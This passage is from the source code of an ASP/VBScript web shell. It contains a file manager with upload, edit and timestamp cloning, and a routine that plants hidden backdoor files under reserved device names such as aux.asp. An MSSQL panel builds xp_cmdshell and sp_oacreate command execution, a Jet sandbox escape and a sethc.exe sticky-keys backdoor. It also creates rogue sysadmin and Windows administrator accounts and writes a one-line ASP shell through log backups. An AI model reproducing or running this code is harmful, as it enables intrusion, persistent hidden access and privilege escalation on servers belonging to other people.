				thePath=getLeft(thePath,"\",False)
			Case"fileUpload"
				StreamUpload()
			Case"showEdit","utfEdit"
				showEdit()
			Case"rnFile","rnFolder"
				renameOne()
				thePath=getLeft(thePath,"\",False)
			Case"cpFile","mvFile","cpFolder","mvFolder"
				moveCopyOne()
				thePath=getLeft(thePath,"\",False)
			Case"getattrib"
				getAttributes()
			Case"Setattrib"
				SetAttributes()
				thePath=getLeft(thePath,"\",False)
			Case"mkDoor"
				MakeBackDoor()
		End Select
		If Len(thePath)<3 Then thePath=thePath&"\"
		FileExplorer()
	End Sub

	Sub FileExplorer()
		Dim theFolder,folderId,extName,parentFolderName,objSize,fullPath,objLastModIfied,nowpath
		If Not isDebugMode Then On Error Resume Next
		If strFileMethod="fso"Then
			Set theFolder=objFso.GetFolder(thePath)
			parentFolderName=objFso.GetParentFolderName(thePath)
		Else
			Set theFolder=objSa.NameSpace(thePath)
			dieErr Err
			parentFolderName=getLeft(thePath,"\",False)
			If InStr(parentFolderName,"\")<1 Then
				parentFolderName=parentFolderName&"\"
			End If
		End If
		nowpath=thePath
		If Right(nowpath,1)<>"\"Then nowpath=nowpath&"\"
		doHidden"nowPath",nowpath
		doForm True
		echo"<b>Current Path :</b>"
		doInput"text","thePath",thePath,120,""
		echoLine""
		doSelect"","170px","onchange=""javascript:if(this.value!=''){dosubmit('"&goaction&"','',this.value);}"""
		doOption"","Drivers/Comm folders"
		doOption htmlEnc(mapath(".")),"."
		doOption htmlEnc(mapath("/")),"/"
		doOption"","----------------"
		If Lcase(strFileMethod)="fso"Then
			For Each drive In objFso.Drives
				doOption drive.DriveLetter&":\",drive.DriveLetter&":\"
			Next
			doOption"","----------------"
		End If
		doOption"C:\Program Files","C:\Program Files"
		doOption"C:\Program Files\RhinoSoft.com","RhinoSoft.com"
		doOption"C:\Program Files\Serv-U","Serv-U"
		doOption"C:\Program Files\Radmin","Radmin"
		doOption"C:\Program Files\Microsoft SQL Server","Mssql"
		doOption"C:\Program Files\Mysql","Mysql"
		doOption"","----------------"
		doOption"C:\Documents and Settings\All Users","All Users"
		doOption"C:\Documents and Settings\All Users\Documents","Documents"
		doOption"C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere","PcAnywhere"
		doOption"C:\Documents and Settings\All Users\Start Menu\Programs","Start Menu->Programs"
		doOption"","----------------"
		doOption"D:\Program Files","D:\Program Files"
		doOption"D:\Serv-U","D:\Serv-U"
		doOption"D:\Radmin","D:\Radmin"
		doOption"D:\Mysql","D:\Mysql"
		doSselect
		doSubmit"Go"
		doFform
		echoLine"<br><form method=""post"" id=""upform""action="""&pagePath&"""enctype=""multipart/form-data"">"
		doHidden"subAct","fileUpload"
		doHidden"thePath",thePath
		doTable"60%"
		doTr 1
		doTdInput"file","upfile","","30%","",""
		doTd"Save As :","15%"
		doTdInput"text","destName","","30%","",""
		doTdInput"button",""," Upload  ","20%","onClick=""javascript:dosubmit('"&goaction&"','fileUpload','')""",""
		doTtr
		doFform
		If strFileMethod="fso"Then
			doTr 0
			doForm True
			doHidden"thePath",thePath
			doHidden"subAct","newone"
			doTdInput"text","newOneName","","","",""
			echo"<td colspan='2'>"
			doInput"radio","newOneType","file","","checked"
			echo"File"
			doInput"radio","newOneType","folder","",""
			echo"Folder</td>"
			doTdSubmit"New one",""
			'doTdInput"button","makedoor","Make backdoor","","onClick=""javascript:dosubmit('"&goaction&"','mkDoor','"&doPathFormat(thePath)&"')""",""
			doFform
			doTtr
		End If
		echo"</table><hr>"
		If strFileMethod="fso"Then
			If Not objFso.FolderExists(thePath)Then
				errMsgAdd thePath&" Folder dosen't exists or access denied!"
				doFin
			End If
		End If
		doShowHideme"Folders",False
		doTable"100%"
		doTh
		doTd"<b>Folder name</b>",""
		doTd"<b>Size</b>",""
		doTd"<b>Last modIfied</b>",""
		echo"<td><b>Action</b>"
		If strFileMethod="fso"Then 
			echo" - "
			doSubHref goaction,"mkDoor",doPathFormat(thePath),"Make a hidden backdoor here",""
		End If
		echo"</td>"
		doTtr
		doTr 0
		echo"<td colspan=""4"">"
		doSubHref goaction,"",doPathFormat(parentFolderName),"Parent Directory",""
		echo"</td>"
		doTtr
		trId=1
		If strFileMethod="fso"Then
			For Each objX In theFolder.SubFolders
				objLastModIfied=objX.DateLastModIfied
				doTr trId
				echo"<td>"
				doSubHref goaction,"",objX.Name,objX.Name,""
				echo"</td>"
				doTd htmlEnc("<dir>"),""
				doTd objLastModIfied,""
				echo"<td>"
				doSubHref goaction,"cpFolder",objX.Name,"Copy"," -"
				doSubHref goaction,"mvFolder",objX.Name,"Move"," -"
				doSubHref goaction,"rnFolder",objX.Name,"Rename"," -"
				doSubHref "AddToMdb","fsoPack",objX.Name,"Package"," -"
				doSubHref goaction,"delFolder",objX.Name,"Delete",""
				echoLine"</td>"
				doTtr
				trIdAdd
			Next
		Else
			For Each objX In theFolder.Items
				If objX.IsFolder Then
					objLastModIfied=theFolder.GetDetailsOf(objX,3)
					doTr trId
					echo"<td>"
					doSubHref goaction,"",objX.Name,objX.Name,""
					echo"</td>"
					doTd htmlEnc("<dir>"),""
					doTd objLastModIfied,""
					echo"<td>"
					doSubHref goaction,"rnFolder",objX.Name,"Rename"," -"
					doSubHref "AddToMdb","appPack",objX.Name,"Package",""
					echoLine"</td>"
					doTtr
					trIdAdd
				End If
			Next
		End If
		doTtable
		echoLine"</span><br>"
		doShowHideme"Files",False
		doTable"100%"
		echo"<b>"
		doTh
		doTd"<b>File name</b>",""
		doTd"<b>Size</b>",""
		doTd"<b>Last modIfied</b>",""
		doTd"<b>Action</b>",""
		doTtr
		echo"</b>"
		trId=0
		If strFileMethod="fso"Then
			For Each objX In theFolder.Files
				objSize=GetTheSize(objX.Size)
				objLastModIfied=objX.DateLastModIfied
				If Lcase(Left(objX.Path,Len(rootPath)))<>Lcase(rootPath) Then
					folderId=""
				Else
					folderId=Replace(Replace(UrlEnc(Mid(objX.Path,Len(rootPath)+1)),"%2E","."),"+","%20")
				End If
				doTr trId
				If folderId=""Then
					doTd objX.Name,""
				Else
					doTd"<a href='"&Replace(folderId,"%5C","/")&"' target=_blank>"&objX.Name&"</a>",""
				End If
				doTd objSize,""
				doTd objLastModIfied,""
				echo"<td>"
				doSubHref goaction,"showEdit",objX.Name,"Edit"," -"
				doSubHref goaction,"cpFile",objX.Name,"Copy"," -"
				doSubHref goaction,"mvFile",objX.Name,"Move"," -"
				doSubHref goaction,"rnFile",objX.Name,"Rename"," -"
				doSubHref goaction,"down",objX.Name,"Down"," -"
				doSubHref goaction,"getattrib",objX.Name,"Attributes"," -"
				doSqlHref "showTables",objX.Name,"","","","Database"," -"
				doSubHref goaction,"delFile",objX.Name,"Delete",""
				echoLine"</td>"
				doTtr
				trIdAdd
			Next
		Else
			For Each objX In theFolder.Items
				If Not objX.IsFolder Then
					Dim fName
					fName=getRight(objX.Path,"\")
					fullPath=doPathFormat(objX.Path)
					objSize=theFolder.GetDetailsOf(objX,1)
					objLastModIfied=theFolder.GetDetailsOf(objX,3)
					If Lcase(Left(objX.Path,Len(rootPath)))<>Lcase(rootPath) Then
						folderId=""
					Else
						folderId=Replace(Replace(UrlEnc(Mid(objX.Path,Len(rootPath)+1)),"%2E","."),"+","%20")
					End If
					doTr trId
					If folderId=""Then
						doTd getRight(objX.Path,"\"),""
					Else
						doTd"<a href='"&Replace(folderId,"%5C","/")&"' target=_blank>"& getRight(objX.Path,"\")&"</a>",""
					End If
					doTd objSize,""
					doTd objLastModIfied,""
					echo"<td>"
					doSubHref goaction,"showEdit",fName,"Edit"," -"
					doSubHref goaction,"rnFile",fName,"Rename"," -"
					doSubHref goaction,"down",fName,"Down"," -"
					doSubHref goaction,"getattrib",fName,"Attributes"," -"
					doSqlHref "showTables",fName,"","","","Database",""
					echoLine"</td>"
					doTtr
					trIdAdd
				End If
			Next
		End If
		doTtable
		echo"</span>"
		chkerr(Err)
	End Sub

	Sub getAttributes()
		Dim fsoTheFile,appTheFile,strName,strAtt,intValue,objFolder,strPth,refName
		If Not isDebugMode Then On Error Resume Next
		If IsObject(objFso)Then
			Set fsoTheFile=objFso.GetFile(thePath)
		End If
		If IsObject(objSa)Then
			strPth=getLeft(thePath,"\",False)
			strName=getRight(thePath,"\")
			Set objFolder=objSa.NameSpace(strPth)
			Set appTheFile=objFolder.ParseName(strName)
		End If
		echo"<center>"
		doTable"60%"
		doForm True
		doHidden"subAct","Setattrib"
		doHidden"thePath",thePath
		doTr 1
		doTdSubmit"Set / Clone",""
		doTd thePath,""
		doTtr
		doTr 0
		doTd"Attributes",""
		If IsObject(objFso)Then
			intValue=fsoTheFile.Attributes
			strAtt="<input type=checkbox name=fsoAttrib value=4 class='input' {$system}>system "
			strAtt=strAtt&"<input type=checkbox name=fsoAttrib value=2 class='input' {$hidden}>hide "
			strAtt=strAtt&"<input type=checkbox name=fsoAttrib value=1 class='input' {$readonly}>readonly "
			strAtt=strAtt&"<input type=checkbox name=fsoAttrib value=32 class='input' {$archive}>save "
			If intValue>=128 Then intValue=intValue-128
			If intValue>=64 Then intValue=intValue-64
			If intValue>=32 Then
				intValue=intValue-32
				strAtt=Replace(strAtt,"{$archive}","checked")
			End If
			If intValue>=16 Then intValue=intValue-16
			If intValue>=8 Then intValue=intValue-8
			If intValue>=4 Then
				intValue=intValue-4
				strAtt=Replace(strAtt,"{$system}","checked")
			End If
			If intValue>=2 Then
				intValue=intValue-2
				strAtt=Replace(strAtt,"{$hidden}","checked")
			End If
			If intValue>=1 Then
				intValue=intValue-1
				strAtt=Replace(strAtt,"{$readonly}","checked")
			End If
			doTd strAtt,""
		Else
			doTd"FSO object disabled,can't get/Set attributes -_-~!",""
		End If
		doTtr
		If IsObject(objSa)Then
			doTr 1
			doTd"Date created",""
			doTd objFolder.GetDetailsOf(appTheFile,4),""
			doTtr
			doTr 0
			doTd"Date last modIfied",""
			doTdInput"text","datem",objFolder.GetDetailsOf(appTheFile,3),"","",""
			doTtr
			doTr 1
			doTd"Date last accessed",""
			doTd objFolder.GetDetailsOf(appTheFile,5),""
			doTtr
		Else
			doTr 1
			doTd"Date created",""
			doTd fsoTheFile.DateCreated,""
			doTtr
			doTr 0
			doTd"Date last modIfied",""
			doTd fsoTheFile.DateLastModIfied,""
			doTtr
			doTr 1
			doTd"Date last accessed",""
			doTd fsoTheFile.DateLastAccessed,""
			doTtr
		End If
		doTr 0
		If IsObject(objSa)Then
			doTd"Clone time ",""
			echo"<td>"
			doSelect"strRefFile","100%",""
			doOption "","Do not clone"
			For Each objX In objFolder.Items
				If Not objX.IsFolder Then
					refName=getRight(objX.Path,"\")
					doOption refName,objFolder.GetDetailsOf(objFolder.ParseName(refName),3)&" --- "&refName
				End If
			Next
		Else
			echo"<td colspan=2>App object disabled,can't modIfy time -_-~!</td>"
		End If
		doTtable
		doFform
		doFin()
	End Sub
	Sub SetAttributes()
		If Not isDebugMode Then On Error Resume Next
		Dim myAttributes,fsoTheFile,strPth,strName,objFolder,appTheFile
		If IsObject(objFso)Then
			Set fsoTheFile=objFso.GetFile(thePath)
		End If
		If IsObject(objSa)Then
			strPth=getLeft(thePath,"\",False)
			strName=getRight(thePath,"\")
			Set objFolder=objSa.NameSpace(strPth)
			Set appTheFile=objFolder.ParseName(strName)
		End If
		If fsoAttrib<>""Then
			fsoAttrib=Split(Replace(fsoAttrib," ",""),",")
			For i=0 To UBound(fsoAttrib)
				myAttributes=myAttributes+CInt(fsoAttrib(i))
			Next
			fsoTheFile.Attributes=myAttributes
			If Err Then
				chkErr(Err)
			Else
				errMsgAdd"Attributes modIfied"
			End If
		End If
		If strRefFile=""Then
			If datem<>"" And IsDate(datem)Then
				appTheFile.ModIfyDate=datem
				If Err Then
					chkErr(Err)
				Else
					errMsgAdd"Time modIfied"
				End If
			End If
		Else
			appTheFile.ModIfyDate=objFolder.GetDetailsOf(objFolder.ParseName(strRefFile),3)
			If Err Then
				chkErr(Err)
			Else
				errMsgAdd"Time modIfied"
			End If
		End If
	End Sub
	Sub MakeBackDoor()
		If fileName<>""Then
			Dim savePath,fTheFile
			savePath="\\.\"&thePath&"\"&fileName
			If moveme=1 Then
				Call objFso.MoveFile(getServerVariable("PATH_TRANSLATED"),savePath)
				Set fTheFile=objFso.GetFile(savePath)
				fTheFile.Attributes=6
				Response.Redirect(fileName)
			Else
				fsoSaveToFile savePath,fileContent
				Set fTheFile=objFso.GetFile(savePath)
				fTheFile.Attributes=6
			End If
			If Err Then
				chkErr(err)
			Else
				errMsgAdd("Backdoor established,have fun.")
			End If
			Exit Sub
		End If
		doForm True
		doTable"100%"
		doHidden"subAct","mkDoor"
		echoLine"<b>Make hidden backdoor</b><br>"
		doTable"100%"
		doTr 1
		doTd"Path","20%"
		doTdInput"text","thePath",thePath,"60%","",""
		doTdSubmit"Save","20%"
		doTtr
		doTr 0
		doTd"Content",""
		doTdText "fileContent","",10
		echo"<td>"
		doChkBox"moveme",1,"Move myself there","onclick='javascript:document.getElementById(""fileContent"").disabled=this.checked'"
		echo"</td>"
		doTtr
		doTr 1
		echo"<td>"
		doSelect"fileName","100%",""
		doOption"aux.asp","aux.asp"
		doOption"con.asp","con.asp"
		doOption"com1.asp","com1.asp"
		doOption"com2.asp","com2.asp"
		doOption"nul.asp","nul.asp"
		doOption"prn.asp","prn.asp"
		doSselect
		echo"</td>"
		echoLine"<td colspan='2'>Cannot del,cannot open in ordinary way,this will drive the web administrator madness :)</td>"
		doTtr
		doTtable
		doFform
		doFin
	End Sub

	Sub PageMsDataBase()
		If Not isDebugMode Then On Error Resume Next
		If connStr=""Then connStr=Request.Cookies(cookiePre&"connStr")
		ShowDBTool()
		If connStr<>""Then
			Select Case subAct
				Case"showQuery"
					showQuery()
				Case"delTable"
					delTable()
				Case"expTable"
					expTable()
				Case"saup","sadown"
					saFile()
				Case Else
					showTables()
			End Select
		End If
		DestoryConn
		doFin
	End Sub

	Sub ShowDBTool()
		Dim rs,rolearr,strfuncs,showfuncs
		If Not isDebugMode Then On Error Resume Next
		showTitle("Database Operation")
		doForm True
		echoLine"Connect String : "
		doInput"text","connStr",connStr,160,""
		echo" "
		doSubmit"OK"
		doFform
		doShowHideMe"GetConnectString",True
		doTable"100%"
		doTr 1
		doTd"SqlOleDb","10%"
		echoLine"<td style=""width:80%"">Server:"
		doInput"text","MsServer","127.0.0.1","15",""
		echo" Username:"
		doInput"text","MsUser","sa","10",""
		echo" Password:"
		doInput"text","MsPass","","10",""
		echo" DataBase:"
		doInput"text","DBPath","","10",""
		echo"</td>"
		doTdInput"button","","Generate","10%","onClick=""javascript:getconnStr(MsServer.value,MsUser.value,MsPass.value,DBPath.value)""",""
		doTtr
		doTr 0
		doTd"Jet",""
		echoLine"<td>DB path:"
		doInput"text","accdbpath",aspPath&"\","82",""
		echo"</td>"
		doTdInput"button","","Generate","10%","onClick=""javascript:getAccStr(accdbpath.value)""",""
		doTtr
		doTtable
		echo"</span><hr>"
		If Err Then Err.clear
		If connStr<>""Then
			CreateConn connStr
			Response.Cookies(cookiePre&"connStr")=connStr
			Set rs=CreateObj("Adodb.RecordSet")
			rs.Open "select @@version,db_name()",conn,1,1
			If Err Then
				dbType="access"
				Err.clear
				Set rs=Nothing
				Set rs=CreateObj("Adodb.RecordSet")
				rs.Open "select cstr('access')",conn,1,1
				If Err Then
					dbType="others"
					Err.clear
				End If
				rs.Close
				Set rs=Nothing
			Else
				sqlver=rs(0)
				dbname=rs(1)
				rs.close
				dbType="mssql"
%>
	<script language=vbscript>
				Function getRegPath(path)
					Dim regRoot,regPath,regKey
					regRoot=getLeft(path,"\",True)
					path=Mid(path,Len(regRoot)+2)
					regKey=getRight(path,"\")
					regPath=getLeft(path,"\",False)
					getRegPath=Array(regRoot,regPath,regKey)
				End Function
				Function doXpStr(xpcmdstr)
					form2.queryStr.value="exec master..xp_cmdshell '"&xpcmdstr&"'"
				End Function
				Function doRegStr(regpath)
					Dim regarr
					regarr=getRegPath(regpath)
					form2.queryStr.value="exec master..xp_regread '"&regarr(0)&"','"&regarr(1)&"','"&regarr(2)&"'"
				End Function
				Function doXpDirStr(xpdirstr)
					form2.queryStr.value="exec master..xp_dirtree '"&xpdirstr&"',1,1"
				End Function
				Function doSpStr(spstr,sptemp,spstep)
					If spstep=2 Then
						form2.queryStr.value="If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"&sptemp&"'"
					Else
						form2.queryStr.value="declare @a int;exec master..sp_oacreate'wscript.shell',@a output;exec master..sp_oamethod @a,'run',null,'"&spstr&" > "&sptemp&"',0,'true'"
					End If
				End Function
				Function doBoxStr(boxstr,boxpath,boxtemp,boxstep)
					Select Case boxstep
						Case 1
							form2.queryStr.value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0"
						Case 2
							boxstr=Replace(boxstr,"""","""""")
							form2.queryStr.value="Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database="&boxpath&"','select shell("""&boxstr&" > "&boxtemp&""")')"
						Case 3
							form2.queryStr.value="If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"&boxtemp&"'"
					End Select
				End Function
				Function doFsoStr(fsoori,fsotag)
					form2.queryStr.value="declare @a int;exec master..sp_oacreate'Scripting.FileSystemObject',@a output;exec master..sp_oamethod @a,'CopyFile',null,'"&fsoori&"','"&fsotag&"'"
				End Function
				Function doMakeCab(cabori,cabtag)
					form2.queryStr.value="exec master..xp_makecab 'C:\windows\temp\~098611.tmp','default',1,'"&cabori&"';exec master..xp_unpackcab 'C:\windows\temp\~098611.tmp','"&getLeft(cabtag,"\",False)&"',1,'"&getRight(cabtag,"\")&"'"
				End Function
				Function doAddSp(addsptag,addspdll)
					form2.queryStr.value="Use master;dbcc addextEndedproc('"&addsptag&"','"&addspdll&"')"
				End Function
				Function doDelSp(delsptag)
					form2.queryStr.value="Use master;dbcc dropextEndedproc('"&delsptag&"')"
				End Function
				Function doEnableSp(ensptag)
					form2.queryStr.value="EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure '"&ensptag&"',1;RECONFIGURE"
				End Function
				Function doRegWrite(rwpath,rwtype,rwvalue)
					Dim regarr
					regarr=getRegPath(rwpath)
					form2.queryStr.value="exec master..xp_regwrite '"&regarr(0)&"','"&regarr(1)&"','"&regarr(2)&"','"&rwtype&"','"&rwvalue&"'"
				End Function
				Function doAddLogin(name,pass)
					form2.queryStr.value="exec master..sp_addlogin '"&name&"','"&pass&"';exec master..sp_addsrvrolemember '"&name&"','sysadmin'"
				End Function
				Function doAddSysUser(name,pass)
					form2.queryStr.value="declare @a int;exec master..sp_oacreate 'ScriptControl',@a output;exec master..sp_oasetproperty @a,'language','VBScript';exec master..sp_oamethod @a,'addcode',null,'sub add():Set o=CreateObject(""Shell.Users""):Set u=o.create("""&name&"""):u.changePassword """&pass&""","""":u.setting(""AccountType"")=3:end sub';exec master..sp_oamethod @a,'run',null,'add'"
				End Function
				Function doLogBackup(logcontent,logpath,dbname,stepp)
					Select Case stepp
						Case 1
							form2.queryStr.value="alter database "&dbname&" Set recovery full;dump transaction "&dbname&" with no_log;If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa sql_variant primary key)"
						Case 2
							form2.queryStr.value="backup database "&dbname&" to disk='C:\windows\temp\~098611.tmp' with init"
						Case 3
							form2.queryStr.value="insert dark_temp values('"&Replace(logcontent,"'","''")&"')"
						Case 4
							form2.queryStr.value="backup log "&dbname&" to disk='"&logpath&"';drop table dark_temp"
					End Select
				End Function
				Function chgDb(dbname)
					On Error Resume Next
					Dim regex,olddb
					Set regex=new RegExp
					regex.Global=True
					regex.IgnoreCase=True
					regex.MultiLine=True
					regex.Pattern="(Database|Initial Catalog) *=[^;]+"
					If regex.test(sqlForm.connStr.value)Then
						sqlForm.connStr.value=secretEncode(regex.Replace(sqlForm.connStr.value,"$1="&dbname))
						sqlForm.subAct="showTables"
						sqlForm.submit
					Else
						Window.alert("Can not get database name in connect string!")
					End If
				End Function
				Function getLeft(str,sign,fromLeft)
					If str="" Or InStr(str,sign)<1 Then
						getLeft=""
						Exit Function
					End If
					If fromLeft Then
						getLeft=Left(str,InStr(str,sign)-1)
					Else
						getLeft=Left(str,InstrRev(str,sign)-1)
					End If
				End Function
				Function getRight(str,sign)
					If str="" Or InStr(str,sign)<1 Then
						getRight=""
						Exit Function
					End If
					getRight=Mid(str,InstrRev(str,sign)+Len(sign))
				End Function
	</script>
<%
			End If
			If subAct="showQuery"And queryStr=""Then
				If dbType="others"Then
					queryStr="select * from "&strTable
				Else
					queryStr="select * from ["&strTable&"]"
				End If
			End If
			doSqlHref "showTables","","","","","Show Tables",""
			echo"<br>"
			doForm True
			doHidden"subAct","showQuery"
			doHidden"connStr",connStr
			doTable"100%"
			If dbType="mssql"Then
				doTr 1
				echoLine"<td colspan=3>Version : "&htmlEnc(sqlver)&"</td>"
				doTtr
				rolearr="sysadmin|db_owner|public"
				doTr 0
				echo"<td colspan=3>"
				For Each strrole In Split(rolearr,"|")
					If strrole="sysadmin"Then
						rs.Open "select IS_SRVROLEMEMBER('"&strrole&"')",conn,1,1
					Else
						rs.Open "select IS_ROLEMEMBER('"&strrole&"')",conn,1,1
					End If
					If rs(0)=1 Then
						echo "Current ServerRole : <font color='red'>"&strrole&"</font> "
						rs.close
						Exit For
					End If
					rs.close
				Next
				echo "| Switch Database : "
				rs.Open "select name from master..sysdatabases",conn,1,1
				rs.movefirst
				Do While Not rs.eof
					echo "<a href=javascript:chgDb('"&rs("name")&"')>"&rs("name")&"</a> | "
					rs.movenext
				Loop
				echo"</td></tr>"
				trIdAdd
				rs.close
				Set rs=Nothing
			End If
			doTr 1
			doTd"Execute Sql","10%"
			doTdText"queryStr",queryStr,5
			doTdSubmit"Submit","10%"
			doTtr
			doTtable
			doFform
			If dbType="mssql"Then
				echo"Functions : "
				strfuncs=Split("xp_cmd|xp_dir|xp_reg|xp_regw|wsexec|sbexec|fsocopy|makecab|addproc|delproc|enfunc|addlogin|addsys|logback|saup|sadown","|")
				showfuncs=Split("xp_cmdshell|xp_dirtree|xp_regread|xp_regwrite|ws exec|sandbox exec|FSO copy|Cab copy|add procedure|del procedure|enable function|add sql user|add sys user|logbackup|saupfile|sadownfile","|")
				For i=0 To UBound(strfuncs)
					echo"<a href='#' onClick=""javascript:showHideMe("&strfuncs(i)&")"" class='hidehref'>"&showfuncs(i)&"</a> | "
				Next
				echo"<br><br>"
				doHideSpan"xp_cmd",True
				doTable"100%"
				doTr 1
				doTd"Command","10%"
				doTdInput"text","xpcmdstr","net user","80%","",""
				doTdInput"button","","Generate","10%","onClick=""javascript:doXpStr(xpcmdstr.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"xp_dir",True
				doTable"100%"
				doTr 1
				doTd"Path","10%"
				doTdInput"text","xpdirstr",aspPath,"80%","",""
				doTdInput"button","","Generate","10%","onClick=""javascript:doXpDirStr(xpdirstr.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"xp_reg",True
				doTable"100%"
				doTr 1
				doTd"Path","10%"
				doTdInput"text","xpregpath","HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName","80%","",""
				doTdInput"button","","Generate","10%","onClick=""javascript:doRegStr(xpregpath.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"xp_regw",True
				doTable"100%"
				doTr 1
				doTd"Path","10%"
				doTdInput"text","rwpath","HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Sethc.exe\debugger","80%","","4"
				doTtr
				doTr 0
				doTd"Type",""
				doTdInput"text","rwtype","REG_SZ","30%","",""
				doTd"Value",""
				doTdInput"text","rwvalue","cmd.exe","40%","",""
				doTdInput"button","","Generate","10%","onClick=""javascript:doRegWrite(rwpath.value,rwtype.value,rwvalue.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"wsexec",True
				doTable"100%"
				doTr 1
				doTd"Command","10%"
				doTdInput"text","spstr","cmd /c net user","","","4"
				doTtr
				doTr 0
				doTd"Temp File",""
				doTdInput"text","sptemp","C:\WINDOWS\Temp\~098611.tmp","50%","",""
				doTd"Step","20%"
				echo"<td width='10%'>"
				doSelect"spstep","100%",""
				doOption 1,1
				doOption 2,2
				doSselect
				echo"</td>"
				doTdInput"button","","Generate","10%","onClick=""javascript:doSpStr(spstr.value,sptemp.value,spstep.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"sbexec",True
				doTable"100%"
				doTr 1
				doTd"Command","10%"
				doTdInput"text","boxstr","cmd /c net user","","","5"				
				doTtr
				doTr 0
				doTd"Mdb Path",""
				doTdInput"text","boxpath","C:\windows\system32\ias\ias.mdb","30%","",""
				doTd"Temp File","10%"
				doTdInput"text","boxtemp","C:\WINDOWS\Temp\~098611.tmp","30%","",""
				echo"<td width='10%'>Step "
				doSelect"boxstep","40px",""
				doOption 1,1
				doOption 2,2
				doOption 3,3
				doSselect
				echo"</td>"
				doTdInput"button","","Generate","10%","onClick=""javascript:doBoxStr(boxstr.value,boxpath.value,boxtemp.value,boxstep.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"fsocopy",True
				doTable"100%"
				doTr 1
				doTd"Source","10%"
				doTdInput"text","fsoori","C:\WINDOWS\system32\cmd.exe","35%","",""
				doTd"Target","10%"
				doTdInput"text","fsotag","C:\WINDOWS\system32\Sethc.exe","35%","",""
				doTdInput"button","","Generate","10%","onClick=""javascript:doFsoStr(fsoori.value,fsotag.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"makecab",True
				doTable"100%"
				doTr 1
				doTd"Source","10%"
				doTdInput"text","cabori","C:\WINDOWS\system32\cmd.exe","35%","",""
				doTd"Target","10%"
				doTdInput"text","cabtag","C:\WINDOWS\system32\Sethc.exe","35%","",""
				doTdInput"button","","Generate","10%","onClick=""javascript:doMakeCab(cabori.value,cabtag.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"addproc",True
				doTable"80%%"
				doTr 1
				doTd"Procedure","20%"
				echo"<td width='20%'>"
				doSelect"addsptag","100%",""
				doOption "xp_cmdshell","xp_cmdshell"
				doOption "xp_dirtree","xp_dirtree"
				doOption "xp_regread","xp_regread"
				doOption "xp_regwrite","xp_regwrite"
				doOption "sp_oacreate","sp_oacreate"
				doSselect
				doTd"DLL","20%"
				echo"<td width='20%'>"
				doSelect"addspdll","100%",""
				doOption "xplog70.dll","xplog70.dll"
				doOption "xpstar.dll","xpstar.dll"
				doOption "odsole70.dll","odsole70.dll"
				doSselect
				doTdInput"button","","Generate","20%","onClick=""javascript:doAddSp(addsptag.value,addspdll.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"delproc",True
				doTable"40%"
				doTr 1
				doTd"Procedure","30%"
				echo"<td width='40%'>"
				doSelect"delsptag","100%",""
				doOption "xp_cmdshell","xp_cmdshell"
				doOption "xp_dirtree","xp_dirtree"
				doOption "xp_regread","xp_regread"
				doOption "xp_regwrite","xp_regwrite"
				doOption "sp_oacreate","sp_oacreate"
				doSselect
				echo"</td>"
				doTdInput"button","","Generate","30%","onClick=""javascript:doDelSp(delsptag.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"enfunc",True
				doTable"40%"
				doTr 1
				doTd"Function","30%"
				echo"<td width='40%'>"
				doSelect"ensptag","100%",""
				doOption "xp_cmdshell","xp_cmdshell"
				doOption "Ole Automation Procedures","sp_oacreate"
				doOption "Ad Hoc Distributed Queries","openrowSet"
				doSselect
				echo"</td>"
				doTdInput"button","","Generate","30%","onClick=""javascript:doEnableSp(ensptag.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"addlogin",True
				doTable"80%"
				doTr 1
				doTd"Username","10%"
				doTdInput"text","addusername","Bloodsword$","30%","",""
				doTd"Password","10%"
				doTdInput"text","adduserpass","0kee","30%","",""
				doTdInput"button","","Generate","20%","onClick=""javascript:doAddLogin(addusername.value,adduserpass.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"addsys",True
				doTable"80%"
				doTr 1
				doTd"Username","10%"
				doTdInput"text","sysname","Bloodsword$","30%","",""
				doTd"Password","10%"
				doTdInput"text","syspass","0kee","30%","",""
				doTdInput"button","","Generate","20%","onClick=""javascript:doAddSysUser(sysname.value,syspass.value)""",""
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"logback",True
				doTable"100%"
				doTr 1
				doTd"Content","10%"
				echo"<td colspan='4'>"
				doTextarea"logContent","<%response.clear:execute request(""value""):response.End%"&">","100%",5,""
				echo"</td>"
				doTdInput"button","","Generate","10%","onClick=""javascript:doLogBackup(logContent.value,logPath.value,logdb.value,logstep.value)""",""
				doTtr
				doTr 0
				doTd"Path","10%"
				doTdInput"text","logPath",mapath(".")&"\system.asp","40%","",""
				doTd"Database","10%"
				doTdInput"text","logdb",dbname,"20%","",""
				doTd"Step","10%"
				echo"<td width='10%'>"
				doSelect"logstep","100%",""
				doOption 1,1
				doOption 2,2
				doOption 3,3
				doOption 4,4
				doSselect
				echo"</td>"
				doTtr
				doTtable
				echo"</span>"
				doHideSpan"saup",True
				echoLine"<form method=""post"" id=""saform""action="""&pagePath&"""enctype=""multipart/form-data"">"
				doHidden"goaction",goaction
				doHidden"subAct","saup"
				doHidden"connStr",connStr
				doTable"100%"
				doTr 1				
				doTdInput"file","safile","","30%","",""
				echoLine"<td align='right'>Save as(full path):</td>"
				doTdInput"text","thePath","","40%","",""
